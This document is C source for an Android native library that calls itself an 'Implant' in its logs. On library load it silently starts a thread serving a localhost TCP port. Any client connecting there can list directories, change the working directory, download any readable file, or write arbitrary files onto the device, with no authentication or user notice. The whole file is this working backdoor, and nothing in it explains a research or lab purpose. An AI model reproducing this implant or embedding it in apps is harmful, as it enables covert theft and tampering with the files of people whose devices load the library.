#include <jni.h>
#include <android/log.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <stdlib.h>

#define PORT 50052
#define BUFFER_SIZE 4096
#define MAX_UPLOAD_SIZE (64 * 1024 * 1024)  // 64 MB max upload size

char cwd[PATH_MAX];

/**
 * Read exactly `count` bytes from socket, handling partial reads.
 * Returns number of bytes read, or -1 on error.
 */
static ssize_t read_full(int fd, void *buf, size_t count) {
    size_t total = 0;
    while (total < count) {
        ssize_t n = read(fd, (char *)buf + total, count - total);
        if (n <= 0) {
            if (n == 0) return total;  // EOF
            if (errno == EINTR) continue;
            return -1;
        }
        total += n;
    }
    return total;
}

/**
 * Write exactly `count` bytes to socket, handling partial writes.
 * Returns number of bytes written, or -1 on error.
 */
static ssize_t write_full(int fd, const void *buf, size_t count) {
    size_t total = 0;
    while (total < count) {
        ssize_t n = write(fd, (const char *)buf + total, count - total);
        if (n <= 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        total += n;
    }
    return total;
}

void *server_thread(void *arg) {
    __android_log_print(ANDROID_LOG_INFO, "Implant", "Server thread started");
    getcwd(cwd, sizeof(cwd));
    int server_fd, new_socket;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    char buffer[BUFFER_SIZE] = {0};

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        __android_log_print(ANDROID_LOG_ERROR, "Implant", "Socket failed");
        return NULL;
    }

    // Allow address reuse
    int opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        __android_log_print(ANDROID_LOG_ERROR, "Implant", "Setsockopt failed");
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = htonl(INADDR_LOOPBACK);  // Use localhost instead of INADDR_ANY
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        __android_log_print(ANDROID_LOG_ERROR, "Implant", "Bind failed");
        close(server_fd);
        return NULL;
    }

    __android_log_print(ANDROID_LOG_INFO, "Implant", "Server bound to port %d", PORT);

    if (listen(server_fd, 3) < 0) {
        __android_log_print(ANDROID_LOG_ERROR, "Implant", "Listen failed");
        close(server_fd);
        return NULL;
    }

    __android_log_print(ANDROID_LOG_INFO, "Implant", "Server listening");

    while (1) {
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
            __android_log_print(ANDROID_LOG_ERROR, "Implant", "Accept failed: %s", strerror(errno));
            continue;
        }
        __android_log_print(ANDROID_LOG_INFO, "Implant", "Accepted connection from client");

        // Set socket recv timeout to avoid blocking forever
        struct timeval tv;
        tv.tv_sec = 300;  // 5 minute timeout
        tv.tv_usec = 0;
        setsockopt(new_socket, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        while (1) {
            memset(buffer, 0, BUFFER_SIZE);
            int valread = read(new_socket, buffer, BUFFER_SIZE - 1);  // Leave room for null terminator
            if (valread <= 0) break;
            buffer[valread] = '\0';  // Ensure null termination

            char *cmd = strtok(buffer, " \n");
            if (!cmd) continue;

            if (strcmp(cmd, "ls") == 0) {
                char *path = strtok(NULL, " \n");
                if (!path) path = cwd;

                DIR *dir = opendir(path);
                if (dir) {
                    struct dirent *entry;
                    while ((entry = readdir(dir)) != NULL) {
                        write_full(new_socket, entry->d_name, strlen(entry->d_name));
                        write_full(new_socket, "\n", 1);
                    }
                    closedir(dir);
                } else {
                    write_full(new_socket, "Error opening directory\n", 24);
                }
                write_full(new_socket, "\0", 1); // end of response
            } else if (strcmp(cmd, "cd") == 0) {
                char *path = strtok(NULL, " \n");
                if (path && chdir(path) == 0) {
                    getcwd(cwd, sizeof(cwd));
                    write_full(new_socket, cwd, strlen(cwd));
                    write_full(new_socket, "\n", 1);
                } else {
                    write_full(new_socket, "Error changing directory\n", 24);
                }
                write_full(new_socket, "\0", 1);
            } else if (strcmp(cmd, "cp") == 0) {
                char *src = strtok(NULL, " \n");
                char *dst = strtok(NULL, " \n");
                char *direction = strtok(NULL, " \n");

                // Validate all arguments are present
                if (!src || !dst || !direction) {
                    __android_log_print(ANDROID_LOG_ERROR, "Implant", "cp: missing arguments");
                    write_full(new_socket, "Error: usage: cp <src> <dst> <upload|download>\n", 47);
                    write_full(new_socket, "\0", 1);
                    continue;
                }

                if (strcmp(direction, "upload") == 0) {
                    // from client to implant
                    int size = 0;
                    if (read_full(new_socket, &size, sizeof(int)) != sizeof(int)) {
                        write_full(new_socket, "Error reading size\n", 19);
                        continue;
                    }

                    // Validate size
                    if (size <= 0 || size > MAX_UPLOAD_SIZE) {
                        __android_log_print(ANDROID_LOG_ERROR, "Implant", "cp upload: invalid size %d", size);
                        write_full(new_socket, "Error: invalid size\n", 20);
                        continue;
                    }

                    char *data = malloc(size);
                    if (!data) {
                        __android_log_print(ANDROID_LOG_ERROR, "Implant", "cp upload: malloc failed for %d bytes", size);
                        write_full(new_socket, "Error: out of memory\n", 21);
                        continue;
                    }

                    ssize_t bytes_read = read_full(new_socket, data, size);
                    if (bytes_read != size) {
                        __android_log_print(ANDROID_LOG_ERROR, "Implant", "cp upload: incomplete read %zd/%d", bytes_read, size);
                        free(data);
                        write_full(new_socket, "Error: incomplete data\n", 23);
                        continue;
                    }

                    int fd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                    if (fd >= 0) {
                        write_full(fd, data, size);
                        close(fd);
                        write_full(new_socket, "OK\n", 3);
                    } else {
                        write_full(new_socket, "Error\n", 6);
                    }
                    free(data);
                } else if (strcmp(direction, "download") == 0) {
                    // from implant to client
                    int fd = open(src, O_RDONLY);
                    if (fd >= 0) {
                        struct stat st;
                        if (fstat(fd, &st) == 0 && S_ISDIR(st.st_mode)) {
                            // It's a directory, send size 0
                            close(fd);
                            off_t zero = 0;
                            write_full(new_socket, &zero, sizeof(off_t));
                        } else {
                            off_t size = lseek(fd, 0, SEEK_END);
                            if (size <= 0) {
                                // Error getting size or empty file, send 0
                                close(fd);
                                off_t zero = 0;
                                write_full(new_socket, &zero, sizeof(off_t));
                            } else {
                                lseek(fd, 0, SEEK_SET);
                                char *data = malloc(size);
                                if (!data) {
                                    close(fd);
                                    off_t zero = 0;
                                    write_full(new_socket, &zero, sizeof(off_t));
                                } else {
                                    read_full(fd, data, size);
                                    close(fd);
                                    write_full(new_socket, &size, sizeof(off_t));
                                    write_full(new_socket, data, size);
                                    free(data);
                                }
                            }
                        }
                    } else {
                        off_t zero = 0;
                        write_full(new_socket, &zero, sizeof(off_t));
                    }
                } else {
                    write_full(new_socket, "Error: direction must be 'upload' or 'download'\n", 48);
                    write_full(new_socket, "\0", 1);
                }
            }
        }
        close(new_socket);
    }
    close(server_fd);
    return NULL;
}

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *vm, void *reserved) {
    __android_log_print(ANDROID_LOG_INFO, "Implant", "JNI_OnLoad called");
    pthread_t thread;
    int result = pthread_create(&thread, NULL, server_thread, NULL);
    if (result != 0) {
        __android_log_print(ANDROID_LOG_ERROR, "Implant", "Failed to create thread: %d", result);
        return JNI_ERR;
    }
    __android_log_print(ANDROID_LOG_INFO, "Implant", "Thread created successfully");
    pthread_detach(thread);

    return JNI_VERSION_1_6;
}